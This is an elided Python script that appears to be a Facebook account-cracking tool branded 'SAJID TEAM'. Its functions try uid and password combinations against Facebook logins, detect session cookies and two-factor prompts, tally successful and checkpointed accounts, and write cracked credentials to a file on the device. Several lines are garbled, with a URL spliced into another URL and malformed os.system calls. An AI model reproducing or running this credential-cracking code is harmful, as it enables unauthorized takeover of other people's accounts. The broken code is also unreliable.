...
\033[1;37m╔ⒽⒷⒻ═════════════════\033[1;33mSAJID✯𝐓𝐄𝐀𝐌\033[1;37m══════════════ⒽⒷⒻ╗

\033[1;31m│\033[1;32m☞  \033[1;32m𝐀𝐔𝐓𝐇𝐎𝐑     \033[1;31m➟   \033[1;32mMOHAMMAD SAJID     \033[1;31m│

\033[1;31m│\033[1;32m☞  \033[1;32m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊   \033[1;31m➟   \033[1;32mMOHAMMADSAJID\033[1;31m     │

\033[1;31m│\033[1;32m☞  \033[1;32m𝐆𝐈𝐓𝐇𝐔𝐁    \033[1;31m ➟   \033[1;32mSAJID-𝐤𝐢𝐧𝐠-05             \033[1;31m │
...
\033[1;37m╚ⒽⒷⒻFACEBOOK TRICKS AND HELPING ZONE{ SBF }\033[1;37mⒽⒷⒻ╝
...
def my_tool_security():
    ...
    my_server=requests.get("https://www.facebook.com/100042882302159/posts/pfbid02ZG78gghaeEdjhr1Vo6MyvoHcPZkrCZcpHhttps://www.facebook.com/md.sajid.ahmed.5403ycnoEsswzLdVF5aZ8GueSYoHZxazael/?app=fbl").text
    ...
    if f_token in my_server:
        ...
        os.system(''https://www.facebook.com/md.sajid.ahmed.540")
...
def password():
    ...
    if passX in ['1','01']:
        ...
        os.system("xdg-openhttps://www.facebook.com/md.sajid.ahmed.540")
...
def free1(uid,pwx,tl):
    ...
    try:
           ...
           "scheme": 'https',
            ...
            if 'c_user' in log_cookies:
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    os.system("play-audio SAJID_2F.mp3")

                    print('\r\033[1;34m[SAJID-2F] '+uid+' [~] '+ps+' ')

                    open('/sdcard/SAJID-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    ...
                    os.system("play-audio SAJID_CP.mp3")

                    print(f'\r\033[1;30m[SAJID-CP] '+uid+' [×] '+ps+ ' ')
        ...
        sys.stdout.write(f'\r\33[1;37m[SAJID 🔥] [%s] \33[1;97m[OK:%s{Sajid}CP:%s]'%(loop,len(ok),len(cp))), 
...
def free2(uid,pwx,tl):
    ...
    try:
           ...
           "scheme": 'https',
            ...
            if 'c_user' in log_cookies:
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    os.system("play-audSAJID-OK-OK.mp3")
        ...
        sys.stdout.write(f'\r\33[1;37m[SAJID 🔥] [%s] \33[1;97m[OK:%s{SAJID2}CP:%s]'%(loop,len(ok),len(cp))), 
...
def free(uid,pwx,tl):
    ...
    try:
        ...
        sys.stdout.write(f'\r\33[1;37m[SAJID 🔥] [%s] \33[1;97m[OK:%s{hamii2}CP:%s]'%(loop,len(ok),len(cp))), 
